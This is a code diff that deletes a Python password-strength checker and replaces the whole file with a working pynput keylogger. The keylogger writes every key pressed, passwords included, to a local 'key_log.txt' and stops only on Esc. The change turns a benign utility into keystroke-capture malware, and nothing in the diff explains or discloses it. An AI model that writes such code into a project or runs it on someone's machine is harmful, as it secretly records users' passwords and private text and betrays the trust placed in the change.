@@ -1,44 +1,32 @@
-import re
+from pynput import keyboard
 
-def assess_password_strength(password):
-    # Define criteria for password strength
-    length_criteria = len(password) >= 8
-    uppercase_criteria = bool(re.search(r'[A-Z]', password))
-    lowercase_criteria = bool(re.search(r'[a-z]', password))
-    digit_criteria = bool(re.search(r'[0-9]', password))
-    special_char_criteria = bool(re.search(r'[\W_]', password))  # Matches any special character
+# Define the log file name
+log_file = "key_log.txt"
 
-    # Count the number of fulfilled criteria
-    criteria_count = sum([length_criteria, uppercase_criteria, lowercase_criteria, digit_criteria, special_char_criteria])
+# Function to write the key to the log file
+def write_to_file(key):
+    with open(log_file, "a") as f:
+        try:
+            f.write(str(key.char))
+        except AttributeError:
+            if key == keyboard.Key.space:
+                f.write(" ")
+            elif key == keyboard.Key.enter:
+                f.write("\n")
+            else:
+                f.write(f" [{str(key)}] ")
 
-    # Determine the strength based on the number of criteria met
-    if criteria_count == 5:
-        strength = "Very Strong"
-    elif criteria_count == 4:
-        strength = "Strong"
-    elif criteria_count == 3:
-        strength = "Moderate"
-    else:
-        strength = "Weak"
+# Function to handle key press events
+def on_press(key):
+    write_to_file(key)
 
-    # Return a dictionary with the details of the assessment
-    return {
-        "length": length_criteria,
-        "uppercase": uppercase_criteria,
-        "lowercase": lowercase_criteria,
-        "digit": digit_criteria,
-        "special_character": special_char_criteria,
-        "strength": strength
-    }
+# Function to handle key release events
+def on_release(key):
+    # Stop listener on pressing the Esc key
+    if key == keyboard.Key.esc:
+        return False
 
-# Example usage
-password = "P@ssw0rd123"
-assessment = assess_password_strength(password)
+# Start listening to the keyboard events
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
 
-print(f"Password Strength: {assessment['strength']}")
-print("Criteria met:")
-print(f"Length: {assessment['length']}")
-print(f"Uppercase Letter: {assessment['uppercase']}")
-print(f"Lowercase Letter: {assessment['lowercase']}")
-print(f"Digit: {assessment['digit']}")
-print(f"Special Character: {assessment['special_character']}")
